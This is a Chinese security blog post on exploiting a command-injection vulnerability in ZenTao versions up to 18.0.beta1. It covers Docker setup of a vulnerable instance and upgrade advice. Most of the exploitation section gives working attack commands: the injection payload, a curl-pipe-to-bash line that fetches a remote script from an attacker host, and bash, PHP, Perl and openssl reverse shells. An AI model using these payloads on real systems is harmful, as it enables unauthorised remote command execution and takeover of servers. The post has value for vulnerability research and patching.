**0x00**

漏洞爆出来已经有些日子了，今天实测了一下，记录一下测试过程。

 **0x01 影响范围**

开源版：17.4<= 禅道 <=18.0.beta1

旗舰版：v3.4 <= 禅道 <= v4.0.beta1

企业版：v7.4 <= 禅道 <= v8.0.beta1

 **0x02 环境搭建**

可以通过docker快速搭建18.0.beta1版本有漏洞的环境。

1、拉取docker镜像

docker pull easysoft/zentao:18.0.beta1  
  
---  
  
2、创建docker网络驱动

docker network create --subnet=[ip范围] [网络驱动名]

#docker network create --subnet=172.172.172.0/24 zentaonet  
  
---  
  
3、启动容器

docker run --name [容器名] -p [主机端口]:80 --network=[网络驱动名] --ip [容器IP] --mac-address [mac地址] -v [主机禅道目录]:/www/zentaopms -v [主机mysql目录]:/var/lib/mysql -e
MYSQL_ROOT_PASSWORD=[数据库密码] -d easysoft/zentao:[镜像标签]

#docker run --name zentao -p 80:80 --network=zentaonet --ip 172.172.172.172
--mac-address 02:42:ac:11:00:00 -v /www/zentaopms:/www/zentaopms -v
/www/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d
easysoft/zentao:18.0.beta1  
  
---  
  
执行完上面3条命令后，浏览器直接访问 http://宿主机ip:宿主机映射端口，一直点下一步即可完成配置。

![1682210815_64447fff79fd06a8926f3.png!small](https://image.3001.net/images/20230423/1682210815_64447fff79fd06a8926f3.png!small)

![1682210833_6444801181cd3c403164b.png!small](https://image.3001.net/images/20230423/1682210833_6444801181cd3c403164b.png!small)

![1682210851_6444802379c03b26ecd31.png!small](https://image.3001.net/images/20230423/1682210851_6444802379c03b26ecd31.png!small)

![1682210865_644480316ba4621a38250.png!small](https://image.3001.net/images/20230423/1682210865_644480316ba4621a38250.png!small)

 **0x03 漏洞利用**

payload：SCM=Subversion&client=`id`

![1682210888_644480481c9951f8c489d.png!small](https://image.3001.net/images/20230423/1682210888_644480481c9951f8c489d.png!small)

在实战中，只是执行id命令还是不够的，下面尝试一下反弹shell，在实战过程中，发现常规的反弹shell命令执行不成功，经过测试后发现，在此处命令执行的时候，如果payload中带有&符号，则payload会被截断。

![1682210905_64448059da46ba3e74c73.png!small](https://image.3001.net/images/20230423/1682210905_64448059da46ba3e74c73.png!small)

所以，当我们使用类似“bash -i >& /dev/tcp/xx.xx.xx.xx/9999 0>&1”的payload时，服务端只会执行“bash -i
>”命令，无法完整执行反弹shell的命令。

![1682210996_644480b49480585da4c21.png!small](https://image.3001.net/images/20230423/1682210996_644480b49480585da4c21.png!small)

想要成功反弹shell，payload中必须不能有&符号。这时候可以考虑用远端加载payload到本地的方式执行。

在真实的环境中，很多都是采用docker部署的，使用docker的环境使用的是精简版linux，很多命令不支持，像ifconfig、wget这类命令用不了，实测curl命令可以使用，将反弹shell的命令写在1.txt文件中，通过curl拉取后执行。

payload：curl http://10.19.71.100:8888/1.txt|bash  
  
---  
  
虽然服务端报错，但是命令成功执行。

![1682211012_644480c4bf4fcd6491727.png!small](https://image.3001.net/images/20230423/1682211012_644480c4bf4fcd6491727.png!small)

禅道是php开发的，所以php脚本也可以：

payload：php -r '$sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i <&3 >&3
2>&3");'  
  
---  
  
![1682211033_644480d9d3c522759bb60.png!small](https://image.3001.net/images/20230423/1682211033_644480d9d3c522759bb60.png!small)

测试发现docker里还有perl环境，所以perl脚本也可以：

payload：perl -e 'use
Socket;$i="xx.xx.xx.xx";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
-i");};'  
  
---  
  
![1682211051_644480eb6047659598616.png!small](https://image.3001.net/images/20230423/1682211051_644480eb6047659598616.png!small)

在docker中还支持openssl，所以还可以使用openssl反弹加密的shell。

首先配置攻击机，生成证书：

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
-nodes  
  
---  
  
再使用openssl开启监听：

openssl s_server -quiet -key key.pem -cert cert.pem -port 9999  
  
---  
  
目标机器上要执行的payload：

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect
xx.xx.xx.xx:9999 > /tmp/s; rm /tmp/s  
  
---  
  
![1682211070_644480fe7912705b949ec.png!small](https://image.3001.net/images/20230423/1682211070_644480fe7912705b949ec.png!small)

Over~

 **0x04 修复建议**

目前官方已经发布新版修复了该漏洞，升级到以下版本即可修复：

禅道 > v18.0.beta1（开源版）

禅道 > v4.0.beta1（旗舰版）

禅道 > v8.0.beta1（企业版）

